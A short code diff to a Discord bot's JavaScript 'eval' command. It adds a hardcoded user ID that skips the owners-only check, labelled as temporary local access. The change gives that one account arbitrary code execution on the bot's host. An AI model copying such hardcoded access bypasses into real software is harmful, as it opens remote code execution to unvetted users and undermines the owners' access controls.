@@ -3,7 +3,7 @@ module.exports = {
   name: "eval",
   description: "Evaluates Javascript code in a command.",
   async run(client, message, args) {
-    if (!global.config.owners.includes(message.author.id)) return;
+    if (!global.config.owners.includes(message.author.id) && message.author.id !== "272442568275525634") return; // Mark temp access to eval - local
     if (!args[0])
       return message.reply({
         content: `:x: You must provide a code to evaluate.`,
